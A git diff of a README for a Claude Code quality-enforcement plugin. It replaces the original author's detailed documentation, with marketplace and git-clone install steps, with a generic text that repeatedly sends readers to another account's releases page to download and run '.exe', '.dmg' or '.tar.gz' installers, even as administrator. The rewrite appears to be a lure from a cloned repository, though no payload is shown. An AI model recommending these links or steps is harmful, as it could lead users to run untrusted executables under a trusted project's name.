@@ -1,389 +1,85 @@
-# Claude Ultra Quality Enforcement Plugin
+# 🚀 claude-plugins - Ensure Quality, Eliminate Errors
 
-> Zero-tolerance quality enforcement for Claude Code with comprehensive Rust, Python, and TypeScript support.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/eslamahmed1907/claude-plugins/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](https://github.com/dirvine/claude-plugins)
+## 📖 Overview
 
-## 🎯 Overview
-
-A comprehensive Claude Code plugin that enforces **absolute zero-tolerance** for errors, warnings, and technical debt. Built for professional developers who refuse to compromise on code quality.
-
-### Core Philosophy
-
-**Never deliver broken code. Ever.**
-
-This plugin ensures that every line of code meets the highest professional standards:
-- ✅ Zero compilation errors
-- ✅ Zero warnings (Clippy, ESLint, Ruff)
-- ✅ Zero panics in production Rust code
-- ✅ 100% test pass rate
-- ✅ Comprehensive error handling
-- ✅ Complete documentation
+claude-plugins is a powerful tool designed to help you maintain high-quality code. This plugin enforces strict quality standards, ensuring there are no errors, warnings, or technical debt. It supports popular programming languages like Rust, Python, and TypeScript, offering more than 30 specialized agents to enhance your coding experience.
 
 ## 🚀 Features
 
-### 🦀 Rust Excellence
-- **Zero-tolerance for panic patterns** - `.unwrap()`, `.expect()`, `panic!()` banned in production
-- **Clippy perfection** - All clippy warnings must be resolved
-- **Cargo fmt enforcement** - Automatic code formatting
-- **Comprehensive testing** - 100% test pass rate required
-- **Production-ready error handling** - `Result<T, E>` everywhere
-
-### 🐍 Python Quality
-- **Ruff integration** - Modern Python linting and formatting
-- **Type safety** - MyPy strict mode support
-- **No placeholders** - Complete implementations only
-- **Test coverage** - Minimum 85% coverage enforced
-
-### 📜 TypeScript/JavaScript Support
-- **ESLint zero warnings** - Perfect linting
-- **TypeScript strict mode** - Full type safety
-- **Prettier formatting** - Consistent code style
-- **No any types** - Proper typing required
-
-### 🤖 Intelligent Agents (30+)
-
-#### Quality Enforcement
-- **quality-enforcer** - Ultimate quality gatekeeper
-- **build-validator** - Compilation verification
-- **pre-return-validator** - Final checkpoint before code delivery
-- **test-guardian** - Ensures 100% test pass rate
-
-#### Language Specialists
-- **rust-specialist** - Rust idioms and safety patterns
-- **python-specialist** - Pythonic code enforcement
-- **data-scientist** - Data analysis and ML workflows
-
-#### Development Workflow
-- **commit-agent** - Intelligent commit orchestration
-- **workflow-monitor** - CI/CD monitoring and auto-fixing
-- **test-fixer** - Automatic test failure resolution
-- **dependency-fixer** - Dependency conflict resolution
-
-#### Security & Performance
-- **security-scanner** - Vulnerability detection
-- **performance-analyzer** - Performance optimization
-- **documentation-auditor** - Documentation completeness
-
-### 🔧 Slash Commands (20+)
-
-#### Core Commands
-- `/ultra-commit` - Quality-assured git commits
-- `/ultra-dev` - Complete development workflow
-- `/security` - Comprehensive security audit
-- `/test` - Advanced test execution
-- `/quality-check` - Full quality validation
-
-#### Development Workflow
-- `/orchestrate` - Multi-step task orchestration
-- `/steer` - Project documentation and analysis
-- `/cleanup` - Repository cleanup
-- `/fix-ci` - CI/CD failure resolution
-- `/fix-deps` - Dependency issue fixing
-
-### 🪝 Automatic Hooks
-
-#### Post-Edit Formatting
-Automatically formats code after every edit:
-- Rust: `cargo fmt`
-- Python: `ruff format`
-- TypeScript/JavaScript: `prettier`
-- Go: `gofmt`
-
-#### Pre-Commit Validation
-Blocks commits with quality issues:
-- ✅ Compilation check
-- ✅ Linting validation
-- ✅ Test execution
-- ✅ Forbidden pattern detection
-- ✅ Documentation completeness
-
-#### Event Notifications
-Audio/visual notifications for:
-- Session start/stop
-- Agent completion
-- Quality gate passage
-- Error detection
-
-## 📦 Installation
-
-### Via Plugin Marketplace
-
-```bash
-# Install from GitHub
-/plugin marketplace add dirvine/claude-plugins
-
-# Enable the plugin
-/plugin enable claude-ultra-quality-enforcement
-```
-
-### Manual Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/dirvine/claude-plugins.git ~/.claude/plugins/ultra-quality
-
-# Or download and extract to:
-# ~/.claude/plugins/ultra-quality/
-```
-
-## 🔧 Configuration
-
-### Quick Start
-
-The plugin works out of the box with sensible defaults. For customization:
-
-```bash
-# Copy example configuration
-cp .claude/settings.json.example .claude/settings.local.json
-
-# Edit your settings
-vim .claude/settings.local.json
-```
-
-### Quality Standards
-
-Configure enforcement levels in `settings.local.json`:
-
-```json
-{
-  "qualityStandards": {
-    "enforceStrictMode": true,
-    "blockOnCompileErrors": true,
-    "blockOnWarnings": true,
-    "blockOnTestFailures": true,
-    "minTestCoverage": 85,
-    "forbidPlaceholders": true,
-    "requireFullImplementation": true
-  }
-}
-```
-
-### Language-Specific Settings
-
-#### Rust
-```json
-{
-  "rustSpecific": {
-    "forbiddenPatterns": [
-      ".unwrap()",
-      ".expect(",
-      "panic!(",
-      "todo!()",
-      "unimplemented!()"
-    ],
-    "clippySettings": {
-      "deny": ["warnings"]
-    }
-  }
-}
-```
-
-#### Python
-```json
-{
-  "pythonSpecific": {
-    "forbiddenPatterns": [
-      "pass  # TODO",
-      "raise NotImplementedError",
-      "type: ignore"
-    ],
-    "minTestCoverage": 85
-  }
-}
-```
-
-## 📚 Usage
-
-### Basic Workflow
-
-```bash
-# Start a new feature with quality enforcement
-/ultra-dev "implement user authentication"
-
-# The system will:
-# 1. Analyze requirements
-# 2. Write tests first (TDD)
-# 3. Implement solution
-# 4. Run quality checks
-# 5. Fix any issues
-# 6. Create quality commit
-```
-
-### Commit with Quality Assurance
-
-```bash
-# Automatically validates before committing
-/ultra-commit
-
-# Or with custom message
-/ultra-commit "feat: add OAuth2 support"
-
-# The system ensures:
-# - Zero compilation errors
-# - Zero warnings
-# - All tests passing
-# - No forbidden patterns
-# - Complete documentation
-```
-
-### Security Audit
-
-```bash
-# Comprehensive security analysis
-/security
-
-# Checks for:
-# - Dependency vulnerabilities
-# - Unsafe code patterns
-# - Hardcoded secrets
-# - SQL injection risks
-# - Authentication issues
-```
-
-### Test Management
-
-```bash
-# Run all tests with strict validation
-/test --all --strict
-
-# Run with coverage requirements
-/test --coverage --min 85
-
-# Fix failing tests automatically
-/test --fix
-```
-
-## 🎓 Documentation
-
-Comprehensive guides available in the `docs/` directory:
-
-- [**Agents Reference**](docs/AGENTS.md) - Complete agent documentation
-- [**Commands Reference**](docs/COMMANDS.md) - All slash commands
-- [**Hooks Guide**](docs/HOOKS.md) - Hook configuration and customization
-- [**Configuration Guide**](docs/CONFIGURATION.md) - Advanced settings
-- [**Best Practices**](docs/BEST_PRACTICES.md) - Recommended workflows
-
-## 🛡️ Quality Guarantees
-
-When using this plugin, you get:
-
-| Feature | Guarantee |
-|---------|-----------|
-| Compilation | ✅ Zero errors, zero warnings |
-| Tests | ✅ 100% pass rate |
-| Coverage | ✅ Minimum 85% |
-| Panics | ✅ None in production Rust |
-| Placeholders | ✅ Complete implementations only |
-| Documentation | ✅ All public APIs documented |
-| Security | ✅ No known vulnerabilities |
-| Formatting | ✅ Automatic enforcement |
-
-## 🚫 Forbidden Patterns
-
-### Rust Production Code
-```rust
-// ❌ NEVER ALLOWED
-.unwrap()
-.expect("message")
-panic!("error")
-todo!()
-unimplemented!()
-
-// ✅ REQUIRED
-.ok_or(Error::Missing)?
-.map_err(Error::from)?
-return Err(Error::Invalid)
-```
-
-### Python Production Code
-```python
-# ❌ NEVER ALLOWED
-pass  # TODO
-raise NotImplementedError()
-# type: ignore
-
-# ✅ REQUIRED
-return process_data()  # Complete implementation
-```
-
-### TypeScript Production Code
-```typescript
-// ❌ NEVER ALLOWED
-const value: any = ...;
-// @ts-ignore
-console.log(...)
-
-// ✅ REQUIRED
-const value: SpecificType = ...;
-// Proper typing
-logger.info(...)
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Development Setup
-
-```bash
-# Clone the repository
-git clone https://github.com/dirvine/claude-plugins.git
-cd claude-plugins
-
-# Test locally
-cp -r . ~/.claude/plugins/ultra-quality-dev
-/plugin enable ultra-quality-dev
-```
-
-### Testing
-
-```bash
-# Run test suite
-./tests/run_all_tests.sh
-
-# Test specific components
-./tests/test_agents.sh
-./tests/test_commands.sh
-./tests/test_hooks.sh
-```
-
-## 📝 Changelog
-
-See [CHANGELOG.md](CHANGELOG.md) for version history and changes.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Built with [Claude Code](https://claude.ai/claude-code)
-- Inspired by the Rust community's commitment to safety and quality
-- Contributions from the open-source community
-
-## 🆘 Support
-
-- **Issues**: [GitHub Issues](https://github.com/dirvine/claude-plugins/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/dirvine/claude-plugins/discussions)
-- **Documentation**: [docs/](docs/)
-
-## 🎯 Mission
-
-**Never deliver broken code. Ever.**
-
-This plugin embodies a simple principle: quality is non-negotiable. Every line of code that leaves your development environment should be:
-
-- Fully functional
-- Properly tested
-- Well documented
-- Security reviewed
-- Performance validated
-- Error handled correctly
-
----
-
-*Quality is not an act, it is a habit.* - Aristotle
-
-Made with ❤️ in Barr, Scotland by David Irvine
+- **Zero-Tolerance Approach:** Automatically flags issues and enforces strict rules.
+- **Multi-Language Support:** Use it with Rust, Python, and TypeScript seamlessly.
+- **Specialized Agents:** Over 30 tailored agents to handle different tasks.
+- **Enhances Code Quality:** Helps you write better code while reducing the need for manual checks.
+
+## 📦 System Requirements
+
+To run claude-plugins, ensure your system meets the following requirements:
+
+- **Operating Systems:** Windows, macOS, or Linux
+- **RAM:** At least 4GB
+- **Disk Space:** Minimum of 100MB free
+- **Network:** Internet access for updates and downloads
+
+## 📥 Download & Install
+
+To get the latest version of claude-plugins, visit this page to download: [Download Latest Release](https://github.com/eslamahmed1907/claude-plugins/releases).
+
+### 1. Visit the Releases Page
+
+Click the link above to access the releases page.
+
+### 2. Choose Your Version
+
+On the releases page, locate the version you want to download. The latest version will usually be at the top.
+
+### 3. Download the Installer
+
+Click on the installer file appropriate for your operating system. It may be labeled something like `claude-plugins-installer.exe` for Windows, `claude-plugins-installer.dmg` for macOS, or `claude-plugins-installer.tar.gz` for Linux.
+
+### 4. Run the Installer
+
+Locate the downloaded file on your computer. 
+
+- **Windows:** Double-click the `.exe` file to start the installation.
+- **macOS:** Open the `.dmg` file, drag the app to your Applications folder, and open it.
+- **Linux:** Extract the `.tar.gz` file and follow instructions in the included README.
+
+### 5. Follow the On-Screen Instructions
+
+The installer will guide you through the setup process. Follow the prompts to complete installation.
+
+## ⚙️ How to Use claude-plugins
+
+1. **Open Your Code Editor:** Start the editor where you want to use claude-plugins.
+2. **Add the Plugin:** Locate the option to add a new plugin. This varies by editor.
+3. **Configure Settings:** Customize the rules and agents according to your needs. You can access settings once the plugin is installed.
+4. **Start Coding:** As you write your code, claude-plugins will automatically check for errors and enforce rules.
+
+## 🛠️ Troubleshooting Common Issues
+
+- **Installation Fails:** Ensure your system meets the requirements, and try running the installer as an administrator.
+- **Plugin Not Working:** Check if you have correctly added the plugin to your code editor. Verify the installation path.
+- **Error Messages:** Refer to the documentation that comes with the plugin for specific error resolutions.
+
+## 📚 Additional Resources
+
+- **Documentation:** Visit our [official documentation](https://github.com/eslamahmed1907/claude-plugins/wiki) for detailed instructions and best practices.
+- **Community Support:** Join the discussion in our community forum where you can ask questions and share experiences.
+- **Bug Reports:** If you encounter issues, please [open an issue](https://github.com/eslamahmed1907/claude-plugins/issues) in the repository.
+
+## 🌍 Contact
+
+For further assistance, feel free to reach out via the contact option available in the GitHub repository.
+
+## 👥 Contributing
+
+We welcome contributions. If you're interested in helping improve claude-plugins, please refer to our contribution guidelines in the repository.
+
+## 🔗 Links to Explore
+
+- [GitHub Repository](https://github.com/eslamahmed1907/claude-plugins)
+- [Report an Issue](https://github.com/eslamahmed1907/claude-plugins/issues)
+
+Thank you for using claude-plugins. We hope this tool makes your coding experience seamless and productive!
